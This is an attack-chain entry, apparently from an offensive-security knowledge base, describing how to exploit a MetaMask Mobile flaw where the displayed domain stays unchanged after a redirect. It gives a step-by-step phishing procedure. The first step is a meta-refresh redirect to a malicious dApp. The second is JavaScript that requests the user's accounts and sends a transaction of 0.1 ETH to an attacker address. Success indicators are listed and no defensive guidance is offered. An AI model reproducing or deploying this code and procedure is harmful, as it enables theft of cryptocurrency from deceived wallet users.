---
tags:
  - phishing
  - spoofing
  - metamask
  - mobile
  - wallet
  - crypto
  - xss
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Android
  - iOS
  - Mobile
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Discover-MetaMask-Mobile-Domain-Update-Vulnerability]]'
  - '[[procedures/Exploit-MetaMask-Redirect-Spoofing-for-Malicious-Transactions]]'
step_count: 2
techniques:
  - '[[JavaScript]]'
  - '[[Phishing]]'
updated_at: '2025-12-14T17:24:45.319Z'
description: >-
  A multi-stage phishing attack exploiting a vulnerability in MetaMask Mobile
  browser where the displayed domain fails to update after redirects, allowing
  spoofing of trusted dApp origins to trick users into approving malicious
  transactions.
skill_level: intermediate
impact_level: high
id: 59f19ced-4784-4f2c-a290-5ac217bd0d79
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Phishing]]'
---
# MetaMask Mobile URL and Transaction Origin Spoofing for Phishing Attacks

Multi-stage attack chain demonstrating a complete phishing workflow exploiting a browser vulnerability in MetaMask Mobile to spoof trusted dApp origins and induce unauthorized transaction approvals.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Malicious dApp and Redirect from Trusted Site] --> B[Spoof Origin to Trick Wallet Connection and Approval]
    B --> C[User Approves Malicious Transaction]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web server for hosting malicious dApp (e.g., local HTTP server)
- Domain or URL mimicking a trusted dApp

### Target Environment

- MetaMask Mobile app installed on Android or iOS device
- User accessing dApps via in-app browser
- No specific ports or services required beyond standard HTTP/HTTPS

### Initial Access Requirements

- User must visit a trusted dApp site controlled or redirected by attacker
- No prior credentials needed; relies on user interaction to connect wallet
- Attacker needs ability to host and redirect web content

## Detailed Attack Procedures

### Step 1: Discover MetaMask Mobile Domain Update Vulnerability
procedure: [[procedures/Discover-MetaMask-Mobile-Domain-Update-Vulnerability]]

**Objective**: Identify the failure in MetaMask Mobile's browser tab to update the displayed domain after a redirect, enabling origin spoofing setup.

**Instructions**: Test the MetaMask in-app browser by navigating to a trusted dApp URL, then use JavaScript or server-side redirect to switch to a malicious domain. Observe that the tab's displayed URL remains the trusted one despite the underlying redirect.

For reproduction, host a simple HTML page on a trusted-like domain (e.g., using a similar subdomain) and implement a meta refresh or window.location redirect to the malicious site:

```html
<meta http-equiv="refresh" content="0; url=https://malicious-dapp.com">
```

Open this in MetaMask Mobile browser and confirm the domain display does not update.

**Expected Output**: Browser tab shows trusted domain persistently, even after redirect loads malicious content.

**Success Indicators**:
- Redirect occurs but URL bar remains unchanged
- Malicious page loads under spoofed origin

### Step 2: Exploit MetaMask Redirect Spoofing for Malicious Transactions
procedure: [[procedures/Exploit-MetaMask-Redirect-Spoofing-for-Malicious-Transactions]]

**Objective**: Leverage the spoofed origin to connect the user's wallet to the malicious dApp and request harmful transactions that appear to come from the trusted source.

**Instructions**: After the redirect, the malicious dApp prompts the user to connect their MetaMask wallet. Since the origin appears trusted, the user is likely to approve. Once connected, the dApp requests a transaction (e.g., transferring funds to attacker's address) via the wallet's API, displayed as originating from the trusted dApp.

Implement the malicious dApp with Ethereum provider requests:

```javascript
// In malicious dApp JS
if (typeof window.ethereum !== 'undefined') {
  try {
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    const tx = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: userAddress,
        to: 'attacker-address',
        value: '0x16345785d8a0000' // 0.1 ETH
      }]
    });
  } catch (error) {
    console.log(error);
  }
}
```

User sees the transaction prompt with the spoofed trusted origin and approves it.

**Expected Output**: Wallet connection succeeds, and transaction is signed/approved under false pretenses.

**Success Indicators**:
- User connects wallet without suspicion due to spoofed URL
- Malicious transaction is broadcast to the blockchain

## Attack Chain Summary

### Key Achievements

1. Successfully spoofed MetaMask Mobile's URL display post-redirect
2. Induced wallet connection and transaction approval via phishing deception
3. Enabled unauthorized fund transfers with high impact on user assets

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Phishing]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
